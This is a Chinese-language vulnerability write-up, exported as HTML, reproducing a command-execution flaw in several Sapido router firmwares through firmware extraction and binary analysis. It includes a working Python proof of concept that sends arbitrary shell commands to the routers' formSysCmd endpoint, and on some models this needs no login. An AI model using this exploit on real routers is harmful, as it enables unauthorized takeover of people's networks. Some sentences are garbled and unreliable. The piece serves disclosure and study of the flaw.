<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="sapido多款路由器命令执行漏洞突破"><span class="csDE05BCC">Sapido</span><span class="csECDA2D3">多款路由器命令执行漏洞</span><span class="csDE05BCC">&amp;</span><span class="csECDA2D3">突破</span></a></h1>
		<h1 class="csAD577193">
			<a name="一、漏洞简介"><span class="csECDA2D3">一、漏洞简介</span></a></h1>
		<h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">BR270n-v2.1.03</span></p><p class="cs40DD2BC9"><span class="cs8926E06">BRC76n-v2.1.03</span></p><p class="cs40DD2BC9"><span class="cs8926E06">GR297-v2.1.3</span></p><p class="cs40DD2BC9"><span class="cs8926E06">RB1732-v2.0.43</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">之前的版本存在命令执行漏洞</span></p><h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="Xb9206b9a8764d8bd03240373122292accf5a5f7"><span class="csD1E291E2">0x01 </span><span class="csD6CA00D2">固件环境模拟</span></a></h3>
		<p class="cs40DD2BC9"><span><img src="IOT安全/Sapido/Sapido%e5%a4%9a%e6%ac%be%e8%b7%af%e7%94%b1%e5%99%a8%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e&%e7%aa%81%e7%a0%b4_files/image0.png" width="560" height="372" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="Xf082cce0b95ad31ee917084054707609fb35a0a"><span class="csD1E291E2">0x02 binwalk</span><span class="csD6CA00D2">解压固件</span></a></h3>
		<p class="cs40DD2BC9"><span><img src="IOT安全/Sapido/Sapido%e5%a4%9a%e6%ac%be%e8%b7%af%e7%94%b1%e5%99%a8%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e&%e7%aa%81%e7%a0%b4_files/image1.png" width="560" height="321" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="IOT安全/Sapido/Sapido%e5%a4%9a%e6%ac%be%e8%b7%af%e7%94%b1%e5%99%a8%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e&%e7%aa%81%e7%a0%b4_files/image2.png" width="560" height="201" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="Xdf17c7ab21b7b7f5a2dbf0ac78c8c9110cf5393"><span class="csD1E291E2">0x03 </span><span class="csD6CA00D2">查看</span><span class="csD1E291E2">web</span><span class="csD6CA00D2">容器</span></a></h3>
		<p class="cs40DD2BC9"><span><img src="IOT安全/Sapido/Sapido%e5%a4%9a%e6%ac%be%e8%b7%af%e7%94%b1%e5%99%a8%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e&%e7%aa%81%e7%a0%b4_files/image3.png" width="560" height="142" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">对于嵌入式设备而言，很多服务都是移植开源的，</span><span class="cs9FB05234">/etc/init.d</span><span class="cs9C1B1871">文件夹下是路由器启动时的加载项，在这些文件中可以看到很多的启动服务等，但是在这里我没有发现</span><span class="cs9FB05234">web</span><span class="cs9C1B1871">容器的启动项，猜测可能厂商进行了二次开发</span></p><h3 class="cs868C439D">
			<a name="X45331161810408f5e892e99a2e58c3fe7f59a3a"><span class="csD1E291E2">0x04 </span><span class="csD6CA00D2">查找</span><span class="csD1E291E2">http</span><span class="csD6CA00D2">服务模块</span></a></h3>
		<p class="cs40DD2BC9"><span><img src="IOT安全/Sapido/Sapido%e5%a4%9a%e6%ac%be%e8%b7%af%e7%94%b1%e5%99%a8%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e&%e7%aa%81%e7%a0%b4_files/image4.png" width="560" height="438" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在这里可以看到很多关于</span><span class="cs9FB05234">http</span><span class="cs9C1B1871">的，我们不去关注</span><span class="cs9FB05234">web</span><span class="cs9C1B1871">网页出现的。因为我们想要知道这款路由器的</span><span class="cs9FB05234">web</span><span class="cs9C1B1871">容器是其中，所以我们把重点放在前面的</span><span class="cs9FB05234">elf</span><span class="cs9C1B1871">文件处，在这里我们看到一个</span><span class="cs9FB05234">cm</span><span class="cs9C1B1871">的</span><span class="cs9FB05234">elf</span><span class="cs9C1B1871">文件，如果知道开源的</span><span class="cs9FB05234">web</span><span class="cs9C1B1871">服务器</span><span class="cs9FB05234">boa</span><span class="cs9C1B1871">可能猜到一些，下面就是</span><span class="cs9FB05234">boa</span><span class="cs9C1B1871">的架构</span></p><p class="cs40DD2BC9"><span><img src="IOT安全/Sapido/Sapido%e5%a4%9a%e6%ac%be%e8%b7%af%e7%94%b1%e5%99%a8%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e&%e7%aa%81%e7%a0%b4_files/image5.png" width="371" height="664" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以这里清晰的看到</span><span class="cs9FB05234">web</span><span class="cs9C1B1871">层的英文如何状语从句：底层通过</span><span class="cs9FB05234">boa</span><span class="cs9C1B1871">进行交互的。那么对于不知道的容器我们又该如何去分析呢？继续我们去分析剩下的</span><span class="cs9FB05234">elf</span><span class="cs9C1B1871">程序，名字通过逐个状语从句：我们分析在</span><span class="cs9FB05234">sysconf</span><span class="cs9C1B1871">程序中发现了</span><span class="cs9FB05234">http</span><span class="cs9C1B1871">请求的处理方式，使用</span><span class="cs9FB05234">ghidra</span><span class="cs9C1B1871">来分析</span><span class="cs9FB05234">sysconf</span></p><p class="cs40DD2BC9"><span><img src="IOT安全/Sapido/Sapido%e5%a4%9a%e6%ac%be%e8%b7%af%e7%94%b1%e5%99%a8%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e&%e7%aa%81%e7%a0%b4_files/image6.png" width="560" height="308" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">通过全文搜索定位</span><span class="cs9FB05234">http</span><span class="cs9C1B1871">到关键函数，在这里我们发现了一个关键的函数</span><span class="cs9FB05234">apmib_get</span><span class="cs9C1B1871">通过猜测也能大概猜到这是一个关于获取的函数，通过</span><span class="cs9FB05234">google</span><span class="cs9C1B1871">可以搜索到这个函数，会发现这个函数是关于</span><span class="cs9FB05234">web</span><span class="cs9C1B1871">开源服务器的</span><span class="cs9FB05234">boa</span><span class="cs9C1B1871">用到的函数，到那么这里我们就已经确认这款路由器的</span><span class="cs9FB05234">web</span><span class="cs9C1B1871">容器的英文</span><span class="cs9FB05234">boa</span><span class="cs9C1B1871">了。既然已经知道了</span><span class="cs9FB05234">boa</span><span class="cs9C1B1871">，肯定那么这个知道有框架一个关键的文件</span><span class="cs9FB05234">syscmd.htm</span><span class="cs9C1B1871">文件，可以执行系统命令，由于但是这款路由器的英文</span><span class="cs9FB05234">asp</span><span class="cs9C1B1871">写的所以我们只进行检索</span><span class="cs9FB05234">syscmd</span></p><p class="cs40DD2BC9"><span><img src="IOT安全/Sapido/Sapido%e5%a4%9a%e6%ac%be%e8%b7%af%e7%94%b1%e5%99%a8%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e&%e7%aa%81%e7%a0%b4_files/image7.png" width="560" height="32" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里可以发现两个文件，一个</span><span class="cs9FB05234">elf</span><span class="cs9C1B1871">文件，一个</span><span class="cs9FB05234">asp</span><span class="cs9C1B1871">文件，打开</span><span class="cs9FB05234">asp</span><span class="cs9C1B1871">文件</span></p><p class="cs40DD2BC9"><span><img src="IOT安全/Sapido/Sapido%e5%a4%9a%e6%ac%be%e8%b7%af%e7%94%b1%e5%99%a8%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e&%e7%aa%81%e7%a0%b4_files/image8.png" width="560" height="274" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在这里可以抛光页面可以执行系统命令</span></p><h3 class="cs868C439D">
			<a name="Xd0452e079a21c8b8ec7674e3ed10a9d68a8975b"><span class="csD1E291E2">0x05 </span><span class="csD6CA00D2">通过</span><span class="csD1E291E2">url</span><span class="csD6CA00D2">访问指定页面</span></a></h3>
		<p class="cs40DD2BC9"><span><img src="IOT安全/Sapido/Sapido%e5%a4%9a%e6%ac%be%e8%b7%af%e7%94%b1%e5%99%a8%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e&%e7%aa%81%e7%a0%b4_files/image9.png" width="560" height="429" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">发现可以执行系统命令，那么这里又是如何处理的呢？</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">通过上面的</span><span class="cs9FB05234">asp</span><span class="cs9C1B1871">文件可以知道，对于输入的命令处理应该和</span><span class="cs9FB05234">formSysCmd</span><span class="cs9C1B1871">有关联，这里我们进行</span><span class="cs9FB05234">grep</span><span class="cs9C1B1871">搜索</span></p><p class="cs40DD2BC9"><span><img src="IOT安全/Sapido/Sapido%e5%a4%9a%e6%ac%be%e8%b7%af%e7%94%b1%e5%99%a8%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e&%e7%aa%81%e7%a0%b4_files/image10.png" width="560" height="76" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以看到一个</span><span class="cs9FB05234">webs</span><span class="cs9C1B1871">的</span><span class="cs9FB05234">elf</span><span class="cs9C1B1871">文件，那么可以猜测这里可能就是</span><span class="cs9FB05234">syscmd</span><span class="cs9C1B1871">执行的临时文件了</span></p><h3 class="cs868C439D">
			<a name="Xfc1948ac07ba33b89c0234ab1b044257668931d"><span class="csD1E291E2">0x06 </span><span class="csD6CA00D2">分析</span><span class="csD1E291E2">webs</span><span class="csD6CA00D2">文件</span></a></h3>
		<p class="cs40DD2BC9"><span><img src="IOT安全/Sapido/Sapido%e5%a4%9a%e6%ac%be%e8%b7%af%e7%94%b1%e5%99%a8%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e&%e7%aa%81%e7%a0%b4_files/image11.png" width="560" height="663" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="IOT安全/Sapido/Sapido%e5%a4%9a%e6%ac%be%e8%b7%af%e7%94%b1%e5%99%a8%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e&%e7%aa%81%e7%a0%b4_files/image12.png" width="560" height="591" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">上面就是整个命令执行的逐步实现方式了，第一个图片可以看到使用</span><span class="cs9FB05234">system</span><span class="cs9C1B1871">函数执行输入的系统命令，第二个图片可以裁剪将执行的结果通过</span><span class="cs9FB05234">cat</span><span class="cs9C1B1871">输入到</span><span class="cs9FB05234">/web/obama.dat</span><span class="cs9C1B1871">文件中，最后将</span><span class="cs9FB05234">obama.dat</span><span class="cs9C1B1871">中的内容输入到</span><span class="cs9FB05234">web</span><span class="cs9C1B1871">界面的文本框里。</span></p><h3 class="cs868C439D">
			<a name="Xbd0506fa4e196c0b3dbde46ec93ad8331ab8a2a"><span class="csD1E291E2">0x07 poc</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234"># Exploit Title: SAPIDO RB-1732 command line execution</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Date: 2019-6-24</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Exploit Author: k1nm3n.aotoi</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Vendor Homepage: http://www.sapido.com.tw/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Software Link: http://www.sapido.com.tw/CH/data/Download/firmware/rb1732/tc/RB-1732_TC_v2.0.43.bin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Version: RB-1732 V2.0.43 </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Tested on: linux</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import sys</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def test_httpcommand(ip, command):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;my_data = {&#39;sysCmd&#39;: command, &#39;apply&#39;: &#39;Apply&#39;, &#39;submit-url&#39;:&#39;/syscmd.asp&#39;, &#39;msg&#39;:&#39;&#39;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;r = requests.post(&#39;http://%s/goform/formSysCmd&#39; % ip, data = my_data)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;content = r.text</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;content = content[</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;content.find(&#39;&lt;textarea rows=&quot;15&quot; name=&quot;msg&quot; cols=&quot;80&quot; wrap=&quot;virtual&quot;&gt;&#39;)+56:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;content.rfind(&#39;&lt;/textarea&gt;&#39;)]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;return content</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">print test_httpcommand(sys.argv[1], &quot; &quot;.join(sys.argv[2:]))</span></p><h3 class="cs868C439D">
			<a name="X34782249b6b1d2b8d61540331dfab2f43f6902c"><span class="csD1E291E2">0x08 </span><span class="csD6CA00D2">运行截图</span></a></h3>
		<p class="cs40DD2BC9"><span><img src="IOT安全/Sapido/Sapido%e5%a4%9a%e6%ac%be%e8%b7%af%e7%94%b1%e5%99%a8%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e&%e7%aa%81%e7%a0%b4_files/image13.png" width="560" height="261" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="X90fd57c4338b34a91d05348405de477eaad6cfc"><span class="csD1E291E2">0x09 BR270n-v2.1.03</span><span class="csD6CA00D2">命令执行突破</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">这个原理和</span><span class="cs8926E06">RB1732</span><span class="cs9C1B1871">差不多，只不过访问的页面变成了</span><span class="cs9FB05234">syscmd.htm</span><span class="cs9C1B1871">了</span></p><p class="cs40DD2BC9"><span><img src="IOT安全/Sapido/Sapido%e5%a4%9a%e6%ac%be%e8%b7%af%e7%94%b1%e5%99%a8%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e&%e7%aa%81%e7%a0%b4_files/image14.png" width="560" height="544" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="Xeef5cc43f1aa633705eb433f900c9d90e53e483"><span class="csD1E291E2">0x010 BRC76n-v2.1.03</span><span class="csD6CA00D2">命令执行漏洞</span></a></h3>
		<p class="cs40DD2BC9"><span><img src="IOT安全/Sapido/Sapido%e5%a4%9a%e6%ac%be%e8%b7%af%e7%94%b1%e5%99%a8%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e&%e7%aa%81%e7%a0%b4_files/image15.png" width="560" height="445" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="Xa0ae9f8925603c94f58d9b9a2e9984dddeafda8"><span class="csD1E291E2">0x011 GR297-v2.1.3</span><span class="csD6CA00D2">命令执行漏洞</span></a></h3>
		<p class="cs40DD2BC9"><span><img src="IOT安全/Sapido/Sapido%e5%a4%9a%e6%ac%be%e8%b7%af%e7%94%b1%e5%99%a8%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e&%e7%aa%81%e7%a0%b4_files/image16.png" width="560" height="431" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="X09a95b6195e006a75d90cd8de1a843a5b845e0d"><span class="csD1E291E2">0x012 </span><span class="csD6CA00D2">总结</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs8926E06">BR270n</span><span class="cs9C1B1871">，</span><span class="cs8926E06">RB1732</span><span class="cs9C1B1871">命令执行有个重置就是登陆路由器，可以进行信息的同步获取用户名和密码，而且又有很多路由器使用的还是其他用户名和密码，</span><span class="cs8926E06">GR297</span><span class="cs9C1B1871">，</span><span class="cs8926E06">BRC76n</span><span class="cs9C1B1871">则不需要进行登陆</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06"><a class="cs508254C" href="http://lab.xinruisec.com/2019/09/05/Sapido多款路由器命令执行漏洞/"><span class="cs4B51D5E4">http://lab.xinruisec.com/2019/09/05/Sapido%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</span></a></span></p></body>
</html>
